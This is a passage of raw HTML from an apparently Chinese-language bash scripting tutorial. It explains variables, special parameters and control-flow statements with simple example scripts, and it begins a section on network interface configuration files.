href=\"#逻辑与和逻辑或\">#</a> 逻辑与和逻辑或</h3>\n<ol>\n<li>\n<p>逻辑与 (&amp;&amp;)<br />\n 逻辑与 (&amp;&amp;) 可以把两个或两个以上命令联系在一起。<br />\n <code>command1&amp;&amp;command2&amp;&amp;....&amp;&amp;command</code> <br />\n 功能：先运行 1，如果 1 成功则运行 2，否则不运行 2，依次类推。</p>\n</li>\n<li>\n<p>逻辑或 (||)</p>\n</li>\n</ol>\n<p>逻辑或 (||) <code>command1||command2||....||command</code></p>\n<p>先运行命令 1 如果运行不成功则运行命令 2，否则不运行命令 2，依次类推。</p>\n<h2 id=\"脚本中的变量\"><a class=\"anchor\" href=\"#脚本中的变量\">#</a> 脚本中的变量</h2>\n<ol>\n<li>等号</li>\n</ol>\n<p>两个注意点：等号前后不能有空格；当需要将一个带有空格的字符串赋给变量时要用单引号括起来。</p>\n<p>要改变变量的值，可以再次赋值。如要把它设置为只读，可在变量前面加上 readonly</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>root@node home<span class=\"token punctuation\">]</span><span class=\"token comment\"># readonly ct=$(date)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">[</span>root@node home<span class=\"token punctuation\">]</span><span class=\"token comment\"># ct=1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>bash: ct: 只读变量</pre></td></tr></table></figure><ol start=\"2\">\n<li>read</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">read</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>格式：read 【选项】 变量名</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>功能：从标准输入设备读入变量的值</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>主要选项说明：</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-p “提示语句”  屏幕上输出的语句</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>实例</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">[</span>root@node ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># ./test.sh </span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>hello world</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>2geshuzhi22 <span class=\"token number\">33</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">22</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token number\">33</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">[</span>root@node ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># cat test.sh </span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#!/bin/bash</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"hello world\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token builtin class-name\">read</span> -p <span class=\"token string\">\"2geshuzhi\"</span> a b</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token variable\">$a</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token variable\">$b</span></pre></td></tr></table></figure><ol start=\"3\">\n<li>引用命令执行结果</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>变量名<span class=\"token operator\">=</span><span class=\"token variable\"><span class=\"token variable\">`</span>命令<span class=\"token variable\">`</span></span> <span class=\"token punctuation\">(</span>两个反引号<span class=\"token punctuation\">)</span>  或  变量名<span class=\"token operator\">=</span><span class=\"token variable\"><span class=\"token variable\">$(</span>命令<span class=\"token variable\">)</span></span></pre></td></tr></table></figure><ol start=\"4\">\n<li>引用（访问）变量与 echo 命令</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>任何变量的引用都是变量前加上‘$’</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">echo</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token punctuation\">[</span>选项<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"显示的信息\"</span> 或 $变量<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-n 显示后并不自动换行</pre></td></tr></table></figure><ol start=\"5\">\n<li>位置变量与 shift 命令</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0,1</span>,2,3<span class=\"token punctuation\">..</span>.9 程序名赋给了0</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">shift</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>格式：shift 【n】</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>功能：是第一个命令行参数无效，并把位置变量2的值移给位置变量1，把位置变量3的值移给位置变量2，</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>依次类推。不会改变位置参数0的值</pre></td></tr></table></figure><ol start=\"6\">\n<li>其他 shell 变量</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#变量</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>该变量存放传递给shell脚本命令行参数的个数。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">[</span>root@node ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># cat test.sh </span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#!/bin/bash</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"hello world\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token builtin class-name\">read</span> -p <span class=\"token string\">\"2geshuzhi\"</span> a b</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token variable\">$a</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token variable\">$b</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token variable\">$#</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">[</span>root@node ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># ./test.sh </span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>hello world</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>2geshuzhi <span class=\"token number\">6666</span> <span class=\"token number\">77</span> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token number\">6666</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token number\">77</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>?变量</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>该变量里存放Shell脚本中最后一条命令的返回码。Linux中每条命令执行完后都会返回一个值，</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>这个值称为返回码。一般执行成功返回0，不成功返回非0的值。</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>*<span class=\"token punctuation\">(</span>@<span class=\"token punctuation\">)</span>变量</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>该变量存放所有输入的命令行参数，并且每个参数之间用空格隔开。</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>在Linux系统中使用*或@变量是等价的。</pre></td></tr></table></figure><h2 id=\"流程控制语句\"><a class=\"anchor\" href=\"#流程控制语句\">#</a> 流程控制语句</h2>\n<h3 id=\"if语句\"><a class=\"anchor\" href=\"#if语句\">#</a> if 语句</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>两路分支（若没有else则变成一路分支）</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span>  判断条件</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">then</span> 命令1</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">else</span> 命令2</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">fi</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>多路分支</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span>  判断条件1</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">then</span> 命令1</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">elif</span> 判断条件1</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">then</span> 命令2</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">..</span>.</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">else</span> 命令n</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">fi</span></pre></td></tr></table></figure><h3 id=\"测试语句\"><a class=\"anchor\" href=\"#测试语句\">#</a> 测试语句</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>测试语句计算一个表达式的值并返回‘真’或‘假’。该语句有两种语法格式，一种是使用关键字test</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>，另一种是使用方括号。格式如下：</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>格式1：</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">test</span> expression</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>格式2</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">[</span>expression<span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h3 id=\"case语句\"><a class=\"anchor\" href=\"#case语句\">#</a> case 语句</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Shell case语句为多选择语句。可以用case语句匹配一个值与一个模式，如果匹配成功，</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>执行相匹配的命令。case语句格式如下：</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">case</span> 值 <span class=\"token keyword\">in</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>模式1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    command1</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    command2</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">..</span>.</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    commandN</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>模式2）</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    command1</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    command2</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">..</span>.</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    commandN</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">esac</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>case工作方式如上所示。取值后面必须为单词in，每一模式必须以右括号结束。取值可以为变量或常数。</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>匹配发现取值符合某一模式后，其间所有命令开始执行直至 <span class=\"token punctuation\">;</span><span class=\"token punctuation\">;</span>。</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>取值将检测匹配的每一个模式。一旦模式匹配，则执行完匹配模式相应命令后不再继续其他模式。</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>如果无一匹配模式，使用星号 * 捕获该值，再执行后面的命令。</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>下面的脚本提示输入1到4，与每一种模式进行匹配：</pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>实例</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">'输入 1 到 4 之间的数字:'</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">'你输入的数字为:'</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token builtin class-name\">read</span> aNum</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">case</span> <span class=\"token variable\">$aNum</span> <span class=\"token keyword\">in</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>  <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">'你选择了 1'</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>  <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">'你选择了 2'</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token number\">3</span><span class=\"token punctuation\">)</span>  <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">'你选择了 3'</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token number\">4</span><span class=\"token punctuation\">)</span>  <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">'你选择了 4'</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    *<span class=\"token punctuation\">)</span>  <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">'你没有输入 1 到 4 之间的数字'</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token punctuation\">;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">esac</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>输入不同的内容，会有不同的结果，例如：</pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>输入 <span class=\"token number\">1</span> 到 <span class=\"token number\">4</span> 之间的数字:</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>你输入的数字为:</pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>你选择了 <span class=\"token number\">3</span></pre></td></tr></table></figure><h3 id=\"for语句\"><a class=\"anchor\" href=\"#for语句\">#</a> for 语句</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>for循环一般格式为：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token for-or-select variable\">var</span> <span class=\"token keyword\">in</span> item1 item2 <span class=\"token punctuation\">..</span>. itemN</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    command1</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    command2</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">..</span>.</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    commandN</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">done</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>实例</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token for-or-select variable\">loop</span> <span class=\"token keyword\">in</span> <span class=\"token number\">1</span> <span class=\"token number\">2</span> <span class=\"token number\">3</span> <span class=\"token number\">4</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"The value is: <span class=\"token variable\">$loop</span>\"</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">done</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>输出结果：</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>The value is: <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>The value is: <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>The value is: <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>The value is: <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>The value is: <span class=\"token number\">5</span></pre></td></tr></table></figure><h3 id=\"while语句\"><a class=\"anchor\" href=\"#while语句\">#</a> while 语句</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>while循环用于不断执行一系列命令，也用于从输入文件中读取数据；命令通常为测试条件。其格式为：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">while</span> condition</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token builtin class-name\">command</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">done</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>以下是一个基本的while循环，测试条件是：如果int小于等于5，那么条件返回真。int从0开始，每次循环处理时，int加1。运行上述脚本，返回数字1到5，然后终止。</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>实例</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#!/bin/bash</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token assign-left variable\">int</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token variable\"><span class=\"token punctuation\">((</span> $int<span class=\"token operator\">&lt;=</span><span class=\"token number\">5</span> <span class=\"token punctuation\">))</span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token builtin class-name\">echo</span> <span class=\"token variable\">$int</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token builtin class-name\">let</span> <span class=\"token string\">\"int++\"</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">done</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>运行脚本，输出：</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>以上实例使用了 Bash <span class=\"token builtin class-name\">let</span> 命令，它用于执行一个或多个表达式，变量计算中不需要加上 $ 来表示变量。</pre></td></tr></table></figure><h3 id=\"无限循环\"><a class=\"anchor\" href=\"#无限循环\">#</a> 无限循环</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>无限循环</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>无限循环语法格式：</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token builtin class-name\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token builtin class-name\">command</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">done</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>或者</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token builtin class-name\">command</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">done</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>或者</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token variable\"><span class=\"token punctuation\">((</span> <span class=\"token punctuation\">;</span> <span class=\"token punctuation\">;</span> <span class=\"token punctuation\">))</span></span></pre></td></tr></table></figure><h3 id=\"until-语句\"><a class=\"anchor\" href=\"#until-语句\">#</a> until 语句</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">until</span> 循环执行一系列命令直至条件为 <span class=\"token boolean\">true</span> 时停止。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">until</span> 循环与 <span class=\"token keyword\">while</span> 循环在处理方式上刚好相反。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>一般 <span class=\"token keyword\">while</span> 循环优于 <span class=\"token keyword\">until</span> 循环，但在某些时候—也只是极少数情况下，until 循环更加有用。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">until</span> 语法格式:</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">until</span> condition</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token builtin class-name\">command</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">done</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>condition 一般为条件表达式，如果返回值为 false，则继续执行循环体内的语句，否则跳出循环。</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>以下实例我们使用 <span class=\"token keyword\">until</span> 命令来输出 <span class=\"token number\">0</span> ~ <span class=\"token number\">9</span> 的数字：</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>实例</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#!/bin/bash</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token assign-left variable\">a</span><span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">until</span> <span class=\"token punctuation\">[</span> <span class=\"token operator\">!</span> <span class=\"token variable\">$a</span> -lt <span class=\"token number\">10</span> <span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>   <span class=\"token builtin class-name\">echo</span> <span class=\"token variable\">$a</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>   <span class=\"token assign-left variable\">a</span><span class=\"token operator\">=</span><span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token function\">expr</span> $a + <span class=\"token number\">1</span><span class=\"token variable\">`</span></span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">done</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#### expr 表达式 表示求表达式的值</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>运行结果：</pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>输出结果为：</pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token number\">6</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token number\">7</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token number\">9</span></pre></td></tr></table></figure><h1 id=\"基本的网络配置\"><a class=\"anchor\" href=\"#基本的网络配置\">#</a> 基本的网络配置</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>网络接口配置文件均存放在 /etc/sysconfig/network-scripts/ 目录下</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span>root@node ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># cat /etc/sysconfig/network-scripts/ifcfg-ens33 </span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token assign-left variable\">TYPE</span><span class=\"token operator\">=</span>Ethernet</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token assign-left variable\">PROXY_METHOD</span><span class=\"token operator\">=</span>none</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token assign-left variable\">BROWSER_ONLY</span><span class=\"token operator\">=</span>no</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token assign-left variable\">BOOTPROTO</span><span class=\"token operator\">=</span>none</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token assign-left variable\">DEFROUTE</span><span class=\"token operator\">=</span>yes</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token assign-left variable\">IPV4_FAILURE_FATAL</span><span class=\"token operator\">=</span>no</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token assign-left variable\">IPV6INIT</span><span class=\"token operator\">=</span>yes</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token assign-left variable\">IPV6_AUTOCONF</span><span class=\"token operator\">=</span>yes</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token assign-left 